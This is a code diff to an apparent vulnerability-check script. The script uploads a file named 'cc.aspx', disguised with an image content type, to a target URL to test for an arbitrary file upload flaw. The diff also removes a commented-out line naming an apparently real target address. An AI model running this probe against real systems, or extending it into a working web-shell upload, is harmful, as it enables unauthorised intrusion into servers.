@@ -28,13 +28,17 @@ def start(host, *args, **kwargs):
 
     input_str = "62CYP5GMbgee"
     binary_str = ' '.join(format(byte, '08b') for byte in input_str.encode('utf-8'))
+    headers = {
+        "Connection": "close",
+        "Content-Type": "multipart/form-data; boundary=fd57033fc7f6ea1b5a2104f51d18c308"
 
+    }
     files = {
         "file": ("cc.aspx", binary_str, "image/jpeg")
     }
 
     try:
-        response = utils.requests_url(url=url, method='post', files=files, timeout=8, *args, **kwargs)
+        response = utils.requests_url(url=url, method='post', files=files, timeout=8, headers=headers, *args, **kwargs)
 
         if response.status_code == 200:
             return True
@@ -45,13 +49,13 @@ def start(host, *args, **kwargs):
 
 
 if __name__ == '__main__':
-    vuln_id = os.path.basename(__file__).split('.')[0]
+    vuln_name = os.path.basename(__file__).split('.')[0]
     if len(sys.argv) < 2:
-        print(f"python <{vuln_id}> <host>")
+        print(f"python <{vuln_name}> <host>")
+        sys.exit()
     parameter = sys.argv[1]
-    # parameter = "http://183.66.184.182:8055"
     r_type = start(parameter)
     if r_type:
-        print(f"{parameter} vuln {vuln_id}: True")
+        print(f"{parameter} vuln {vuln_name}: True")
     else:
-        print(f"{parameter} vuln {vuln_id}: False")
+        print(f"{parameter} vuln {vuln_name}: False")
